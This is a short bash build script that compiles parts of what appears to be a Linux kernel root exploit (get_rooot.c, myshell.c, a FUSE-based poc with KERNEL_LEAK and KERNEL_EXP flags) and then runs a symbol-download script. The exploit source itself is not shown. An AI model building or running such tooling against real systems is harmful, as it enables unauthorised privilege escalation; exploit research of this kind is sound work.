#!/bin/bash

gcc -o get_rooot get_rooot.c -w
gcc -o myshell myshell.c -w
gcc -no-pie -static poc.c fuse_evil.c -I./libfuse libfuse3.a -o poc -masm=intel -pthread -w \
    -D EXPAND_LOWER_ORDER -D VERSION_5_30 -D KERNEL_LEAK -D KERNEL_EXP
    
chmod +x ./download_symbol.sh
./download_symbol.sh